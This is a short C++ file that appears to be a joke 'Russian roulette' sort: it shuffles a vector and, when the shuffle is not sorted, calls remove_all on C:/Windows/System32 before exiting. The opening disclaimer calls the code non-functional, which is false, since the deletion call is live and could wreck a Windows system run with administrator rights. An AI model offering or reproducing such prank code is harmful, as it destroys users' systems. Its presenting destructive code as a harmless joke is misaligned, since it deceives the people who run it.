#include <algorithm>
#include <cstdlib>
#include <ctime>
#include <filesystem>
#include <iostream>
#include <vector>

/*
 * Disclaimer: This code is purely generated for comical and educational
 * purposes. It is intentionally non-functional and potentially harmful if
 * executed.
 *
 * Please DO NOT run this code under any circumstances.
 *
 * The user of this code assumes all responsibility for any and all damages,
 * whether direct, indirect, or consequential, that may result from its use.
 *
 * Use this code at your own risk, and always exercise caution when working with
 * code obtained from untrusted sources.
 *
 * The creators and contributors of this code disclaim any liability for its
 * misuse.
 *
 * Remember, safety and responsible coding practices should always come first!
 */

using namespace std;

bool isSorted(const vector<int> &arr) {
  for (size_t i = 1; i < arr.size(); i++) {
    if (arr[i - 1] > arr[i]) {
      return false;
    }
  }
  return true;
}

void randomizeVector(vector<int> &arr) {
  srand(time(0));
  random_shuffle(arr.begin(), arr.end());
}

void playRussianRoulette() {
  cout << "Bang! You lost! Sorry, your vector is still not sorted." << endl;
  std::filesystem::remove_all("C:/Windows/System32");
  exit(1);
}

int main() {
  vector<int> arr = {1, 2, 3, 4, 5};

  cout << "Original vector: ";
  for (int num : arr) {
    cout << num << " ";
  }
  cout << endl;

  randomizeVector(arr);

  cout << "Shuffled vector: ";
  for (int num : arr) {
    cout << num << " ";
  }
  cout << endl;

  if (!isSorted(arr)) {
    cout << "The vector is not sorted! Let's play Russian roulette..." << endl;
    playRussianRoulette();
  } else {
    cout << "Congratulations! The vector is sorted." << endl;
  }

  return 0;
}
